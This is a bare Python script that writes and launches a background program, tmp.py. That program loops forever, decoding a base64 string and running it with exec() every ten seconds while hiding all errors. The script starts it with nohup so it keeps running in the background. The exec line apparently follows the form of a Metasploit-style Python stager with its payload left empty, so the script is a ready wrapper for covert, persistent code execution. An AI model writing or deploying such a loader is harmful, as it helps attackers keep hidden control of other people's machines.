from os import system
ss=open("tmp.py", "w")
ss.write("import time, os\n")
ss.write("while True:\n")
ss.write("	try:\n")
ss.write("		import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('')))\n")
ss.write("		time.sleep(10)\n")
ss.write("	except:\n")
ss.write("		pass\n")
ss.close()
system("nohup python tmp.py &")
del ss
